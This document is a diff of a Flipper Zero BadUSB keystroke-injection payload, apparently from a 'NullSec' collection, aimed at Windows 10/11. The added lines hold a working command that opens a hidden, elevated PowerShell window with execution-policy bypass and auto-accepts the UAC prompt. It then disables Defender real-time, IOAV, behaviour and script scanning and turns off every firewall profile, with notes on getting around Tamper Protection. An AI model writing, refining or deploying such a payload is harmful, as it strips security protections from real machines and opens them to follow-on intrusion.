@@ -2,12 +2,29 @@ REM ========================================
 REM NullSec Flipper Zero BadUSB
 REM Payload: Disable Windows Defender
 REM Target: Windows 10/11
+REM Author: bad-antics
+REM Version: 2.0
+REM ========================================
+REM
+REM IMPORTANT: Windows Tamper Protection must
+REM be disabled MANUALLY before running this
+REM payload. Tamper Protection blocks all
+REM programmatic changes to Defender settings
+REM even from elevated PowerShell.
+REM
+REM To disable Tamper Protection:
+REM   Windows Security > Virus & threat
+REM   protection > Manage settings >
+REM   Tamper Protection > Off
+REM
 REM ========================================
 DELAY 1000
 GUI r
-DELAY 500
-STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; netsh advfirewall set allprofiles state off"'
+DELAY 700
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c \"try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableScriptScanning $true;netsh advfirewall set allprofiles state off;echo SUCCESS>$env:TEMP\ndef.log}catch{echo TAMPER_PROTECTION_ENABLED>$env:TEMP\ndef.log}\"'"
 ENTER
-DELAY 2000
+DELAY 3000
+REM Accept UAC prompt (increase delay above if needed for slower machines)
 ALT y
+DELAY 500
 ENTER
